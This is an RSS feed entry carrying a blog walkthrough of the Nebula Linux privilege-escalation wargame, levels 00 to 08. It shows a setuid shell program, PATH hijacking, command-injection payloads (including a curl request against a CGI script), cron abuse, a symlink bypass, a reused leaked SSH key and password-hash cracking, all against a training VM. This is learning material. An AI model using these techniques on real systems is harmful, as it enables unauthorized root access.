@@ -1,0 +1,1972 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Exercises on #!/slash/note</title>
+    <link>http://leonjza.github.io/categories/exercises/</link>
+    <description>Recent content in Exercises on #!/slash/note</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 08 May 2015 07:18:31 +0000</lastBuildDate>
+    <atom:link href="http://leonjza.github.io/categories/exercises/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>playing exploit-exercises - nebula</title>
+      <link>http://leonjza.github.io/2015/05/08/playing-exploit-exercises-nebula/</link>
+      <pubDate>Fri, 08 May 2015 07:18:31 +0000</pubDate>
+      
+      <guid>http://leonjza.github.io/2015/05/08/playing-exploit-exercises-nebula/</guid>
+      <description>
+
+&lt;h2 id=&#34;introduction:0683a5d670a26d450d97365e52610fb5&#34;&gt;introduction&lt;/h2&gt;
+
+&lt;p&gt;Recently I decided I wanted to have a look at what &lt;a href=&#34;https://exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for &lt;a href=&#34;https://exploit-exercises.com/nebula/&#34;&gt;Nebula&lt;/a&gt;. &lt;em&gt;Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;{% img &lt;a href=&#34;https://i.imgur.com/6K9zeta.jpg&#34;&gt;https://i.imgur.com/6K9zeta.jpg&lt;/a&gt; %}&lt;/p&gt;
+
+&lt;p&gt;I did not really have a lot of time on my hands and figured I should start with the &amp;ldquo;easy&amp;rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)&lt;/p&gt;
+
+&lt;p&gt;This is the path I took to solve the 20 challenges.&lt;/p&gt;
+
+&lt;h2 id=&#34;setup:0683a5d670a26d450d97365e52610fb5&#34;&gt;setup&lt;/h2&gt;
+
+&lt;p&gt;On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.&lt;/p&gt;
+
+&lt;p&gt;After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » ssh level00@192.168.217.239
+no hostkey alg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;sigh&lt;/em&gt;. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the &lt;code&gt;nebula&lt;/code&gt; account to root and generated a RSA host key with: &lt;code&gt;ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key&lt;/code&gt; with no password. I was now able to log in:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ » ssh level00@192.168.217.239
+The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
+RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+level00@192.168.217.239&#39;s password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release &#39;12.04 LTS&#39; available.
+Run &#39;do-release-upgrade&#39; to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+level00@nebula:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I could see that I was now logged in as level00&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ id
+uid=1001(level00) gid=1001(level00) groups=1001(level00)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The challenges are all in their respective &lt;code&gt;flag&lt;/code&gt; folder. So if you are logged in as &lt;code&gt;level00&lt;/code&gt;, you are interested in &lt;code&gt;flag00&lt;/code&gt;. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command &lt;code&gt;getflag&lt;/code&gt; could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running &lt;code&gt;getflag&lt;/code&gt; is enough to consider a level done. I had prepared a small C setuid shell in &lt;code&gt;/var/tmp/shell.c&lt;/code&gt; with the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;
+
+int main(void) {
+    setresuid(geteuid(), geteuid(), geteuid());
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This shell was reused throughout the challenges. Lets dig into the challenges themselves.&lt;/p&gt;
+
+&lt;h2 id=&#34;level00:0683a5d670a26d450d97365e52610fb5&#34;&gt;level00&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level00/&#34;&gt;Level00&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know &lt;em&gt;about&lt;/em&gt; SUID binaries :P&lt;/p&gt;
+
+&lt;p&gt;So, to solve level00:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lh
+-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
+-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
+-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
+-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
+-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
+-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
+-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
+-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
+-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
+-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
+[...]
+
+level00@nebula:~$ /bin/.../flag00
+Congrats, now run getflag to get your flag!
+
+flag00@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level01:0683a5d670a26d450d97365e52610fb5&#34;&gt;level01&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level01/&#34;&gt;Level01&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```c level1.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();&lt;/p&gt;
+
+&lt;p&gt;setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);&lt;/p&gt;
+
+&lt;p&gt;system(&amp;ldquo;/usr/bin/env echo and now what?&amp;rdquo;);
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+We can see a bunch of UID/GID stuff being set with with `setresgid` and `setresuid` and then a system command being run with `system()`. The problem lies in the fact that the command that is being run does not have a full path specified for the `echo` command. Even though its called with `/usr/bin/env`, it is possible to modify the current `PATH` variable and have `env` report echo as being somewhere other than where it would normally be.
+
+On the filesystem we find the `flag01` binary and can see it is setuid for `flag01` user (we are currently logged in as `level01`):
+
+```bash
+level01@nebula:~$ cd ~flag01/
+level01@nebula:/home/flag01$ ls -lh flag01
+-rwsr-x--- 1 flag01 level01 7.2K 2011-11-20 21:22 flag01
+
+level01@nebula:/home/flag01$ ./flag01
+and now what?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Abusing this is really easy. I decided to create my own &lt;code&gt;echo&lt;/code&gt; binary and modified &lt;code&gt;PATH&lt;/code&gt; so that it is called instead of the real &lt;code&gt;echo&lt;/code&gt;. A small note here though. The Nebula vm has &lt;code&gt;/tmp&lt;/code&gt; mounted with the &lt;code&gt;nosuid&lt;/code&gt; option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being &lt;code&gt;/var/tmp&lt;/code&gt; was not mounted separately and I had write access there :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ mount | grep &amp;quot;/tmp&amp;quot;
+tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
+
+level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
+drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, to solve level01:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ cat /var/tmp/echo
+#!/bin/sh
+gcc /var/tmp/shell.c -o /var/tmp/flag01
+chmod 4777 /var/tmp/flag01
+
+level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
+-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo
+
+level01@nebula:/home/flag01$ cat /var/tmp/shell.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int main(void) {
+    setresuid(geteuid(), geteuid(), geteuid());
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+
+level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH
+level01@nebula:/home/flag01$ ./flag01
+level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
+-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01
+
+level01@nebula:/home/flag01$ /var/tmp/flag01
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level02:0683a5d670a26d450d97365e52610fb5&#34;&gt;level02&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level02/&#34;&gt;Level02&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```c level2.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  char *buffer;&lt;/p&gt;
+
+&lt;p&gt;gid_t gid;
+  uid_t uid;&lt;/p&gt;
+
+&lt;p&gt;gid = getegid();
+  uid = geteuid();&lt;/p&gt;
+
+&lt;p&gt;setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);&lt;/p&gt;
+
+&lt;p&gt;buffer = NULL;&lt;/p&gt;
+
+&lt;p&gt;asprintf(&amp;amp;buffer, &amp;ldquo;/bin/echo %s is cool&amp;rdquo;, getenv(&amp;ldquo;USER&amp;rdquo;));
+  printf(&amp;ldquo;about to call system(\&amp;ldquo;%s\&amp;ldquo;)\n&amp;rdquo;, buffer);&lt;/p&gt;
+
+&lt;p&gt;system(buffer);
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+Level02 is very similar to Level01, except for that fact that here the line `/bin/echo %s is cool` is copied to `buffer` and eventually put through a `system()` call. The value of the current environment variable `USER` is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (*is cool* in this case).
+
+So, to solve level02:
+
+```bash
+level02@nebula:/home/flag02$ ./flag02
+about to call system(&amp;quot;/bin/echo level02 is cool&amp;quot;)
+level02 is cool
+
+level02@nebula:/home/flag02$ USER=&amp;quot;bob&amp;quot; &amp;amp;&amp;amp; ./flag02
+about to call system(&amp;quot;/bin/echo bob is cool&amp;quot;)
+bob is cool
+
+level02@nebula:/home/flag02$ cat /var/tmp/shell.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int main(void) {
+    setresuid(geteuid(), geteuid(), geteuid());
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+
+level02@nebula:/home/flag02$ USER=&amp;quot;bob; id;#&amp;quot; &amp;amp;&amp;amp; ./flag02
+about to call system(&amp;quot;/bin/echo bob; id;# is cool&amp;quot;)
+bob
+uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
+
+level02@nebula:/home/flag02$ USER=&amp;quot;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&amp;quot; &amp;amp;&amp;amp; ./flag02
+about to call system(&amp;quot;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&amp;quot;)
+bob
+
+level02@nebula:/home/flag02$ /var/tmp/flag02
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level03:0683a5d670a26d450d97365e52610fb5&#34;&gt;level03&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level03/&#34;&gt;Level03&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+Check the home directory of flag03 and take note of the files there.
+There is a crontab that is called every couple of minutes.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Logging in as &lt;code&gt;level03&lt;/code&gt;, we find a directory and a &lt;code&gt;sh&lt;/code&gt; script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:~$ cd ~flag03
+level03@nebula:/home/flag03$ ls -lh
+total 512
+drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
+-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
+
+level03@nebula:/home/flag03$ cat writable.sh
+#!/bin/sh
+
+for i in /home/flag03/writable.d/* ; do
+    (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
+    rm -f &amp;quot;$i&amp;quot;
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With the mention of a cronjob, I assumed the &lt;code&gt;writable.sh&lt;/code&gt; script was being run. From the source of the script we can see that everything in &lt;code&gt;/home/flag03/writable.d/&lt;/code&gt; will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using &lt;code&gt;bash -x&lt;/code&gt;. Once done, the file is removed. Easy to exploit.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level03:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
+level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh
+#!/bin/sh
+gcc /var/tmp/shell.c -o /var/tmp/flag03
+chmod 4777 /var/tmp/flag03
+
+level03@nebula:/home/flag03$ cat /var/tmp/shell.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int main(void) {
+    setresuid(geteuid(), geteuid(), geteuid());
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+
+level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/
+
+level03@nebula:/home/flag03$ # wait some time for the cronjob
+
+level03@nebula:/home/flag03$ /var/tmp/flag03
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level04:0683a5d670a26d450d97365e52610fb5&#34;&gt;level04&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level04/&#34;&gt;Level04&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```c level4.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;&lt;/p&gt;
+
+&lt;p&gt;if(argc == 1) {
+      printf(&amp;ldquo;%s [file to read]\n&amp;rdquo;, argv[0]);
+      exit(EXIT_FAILURE);
+  }&lt;/p&gt;
+
+&lt;p&gt;if(strstr(argv[1], &amp;ldquo;token&amp;rdquo;) != NULL) {
+      printf(&amp;ldquo;You may not access &amp;lsquo;%s&amp;rsquo;\n&amp;rdquo;, argv[1]);
+      exit(EXIT_FAILURE);
+  }&lt;/p&gt;
+
+&lt;p&gt;fd = open(argv[1], O_RDONLY);
+  if(fd == -1) {
+      err(EXIT_FAILURE, &amp;ldquo;Unable to open %s&amp;rdquo;, argv[1]);
+  }&lt;/p&gt;
+
+&lt;p&gt;rc = read(fd, buf, sizeof(buf));&lt;/p&gt;
+
+&lt;p&gt;if(rc == -1) {
+      err(EXIT_FAILURE, &amp;ldquo;Unable to read fd %d&amp;rdquo;, fd);
+  }&lt;/p&gt;
+
+&lt;p&gt;write(1, buf, rc);
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+From the snippet we can see that a check is in place for the first argument to see if the string `token` exists in it. As the token we want to read is actually called *token* this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.
+
+So, to solve level04:
+
+```bash
+level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
+level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
+06508b5e-8909-4f38-b630-fdb148a848a2
+
+level04@nebula:/home/flag04$ su - flag04
+Password:
+flag04@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level05:0683a5d670a26d450d97365e52610fb5&#34;&gt;level05&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level05&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+Check the flag05 home directory. You are looking for weak directory permissions
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Browsing to the &lt;code&gt;flag05&lt;/code&gt; directory we can see a &lt;code&gt;.backup&lt;/code&gt; directory containing a tar archive that is readable. This archive contained a private key that allowed login as the &lt;code&gt;flag05&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level05:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ cd ~flag05
+level05@nebula:/home/flag05$ ls -lah
+total 5.0K
+drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
+drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
+-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+
+level05@nebula:/home/flag05$ cd .backup/
+level05@nebula:/home/flag05/.backup$ ls -lah
+total 2.0K
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
+drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
+-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz
+
+level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+
+level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
+The authenticity of host &#39;127.0.0.1 (127.0.0.1)&#39; can&#39;t be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;127.0.0.1&#39; (ECDSA) to the list of known hosts.
+
+[...]
+
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level06:0683a5d670a26d450d97365e52610fb5&#34;&gt;level06&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level06&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+The flag06 account credentials came from a legacy unix system.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Legacy unix system? This immediately had me thinking that the password hash may be in &lt;code&gt;/etc/passwd&lt;/code&gt;. Older unix systems used to store passwords this way, but that is no longer the case.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ cat /etc/passwd| grep flag06
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The hash &lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt; is something that I had to send to &lt;code&gt;john&lt;/code&gt; to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ # cat hash
+ueqwOCnSGdsuM
+
+~ # john hash
+Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
+hello            (?)
+guesses: 1  time: 0:00:00:00 DONE (Fri May  8 17:29:20 2015)  c/s: 102400  trying: 123456 - Pyramid
+Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The password is &lt;code&gt;hello&lt;/code&gt;.
+So, to solve level06:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ su - flag06
+Password:
+flag06@nebula:~$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level07:0683a5d670a26d450d97365e52610fb5&#34;&gt;level07&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level07/&#34;&gt;Level07&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;
+
+&lt;p&gt;```perl index.cgi
+#!/usr/bin/perl&lt;/p&gt;
+
+&lt;p&gt;use CGI qw{param};&lt;/p&gt;
+
+&lt;p&gt;print &amp;ldquo;Content-type: text/html\n\n&amp;rdquo;;&lt;/p&gt;
+
+&lt;p&gt;sub ping {
+  $host = $_[0];&lt;/p&gt;
+
+&lt;p&gt;print(&amp;rdquo;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&amp;rdquo;);&lt;/p&gt;
+
+&lt;p&gt;@output = &lt;code&gt;ping -c 3 $host 2&amp;gt;&amp;amp;1&lt;/code&gt;;
+  foreach $line (@output) { print &amp;ldquo;$line&amp;rdquo;; }&lt;/p&gt;
+
+&lt;p&gt;print(&amp;rdquo;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&amp;rdquo;);&lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;h1 id=&#34;check-if-host-set-if-not-display-normal-page-etc:0683a5d670a26d450d97365e52610fb5&#34;&gt;check if Host set. if not, display normal page, etc&lt;/h1&gt;
+
+&lt;p&gt;ping(param(&amp;ldquo;Host&amp;rdquo;));&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the `flag07` directory one can see a `thttpd.conf` file which contains the port of the webserver serving this script on.
+
+```bash
+level07@nebula:/home/flag07$ grep port thttpd.conf
+# Specifies an alternate port number to listen on.
+port=7007
+# all hostnames supported on the local machine. See thttpd(8) for details.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Exploiting the vulnerability simply meant that we have to inject commands into the &lt;code&gt;Host&lt;/code&gt; parameter. I normally use python&amp;rsquo;s urllib to ensure that fields are properly url encoded etc.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level07:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:7007/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;Host&amp;quot; : &amp;quot;127.0.0.1 &amp;amp;&amp;amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;amp;&amp;amp; chmod 4777 /var/tmp/flag07&amp;quot; })&#39;)&amp;quot;
+* Hostname was NOT found in DNS cache
+*   Trying 192.168.217.239...
+* Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)
+&amp;gt; GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
+&amp;gt; User-Agent: curl/7.37.1
+&amp;gt; Host: 192.168.217.239:7007
+&amp;gt; Accept: */*
+&amp;gt;
+* HTTP 1.0, assume close after body
+&amp;lt; HTTP/1.0 200 OK
+&amp;lt; Content-type: text/html
+&amp;lt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
+64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
+64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms
+* Closing connection 0
+&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally back on the NebulaVM after this curl from my host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level07@nebula:/home/flag07$ /var/tmp/flag07
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level08:0683a5d670a26d450d97365e52610fb5&#34;&gt;level08&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level08/&#34;&gt;Level08&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Logging in as the user &lt;code&gt;level08&lt;/code&gt; reveals a pcap in the &lt;code&gt;flag08&lt;/code&gt; directory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:~$ cd ~flag08
+level08@nebula:/home/flag08$ ls
+capture.pcap
+
+level08@nebula:/home/flag08$ file capture.pcap
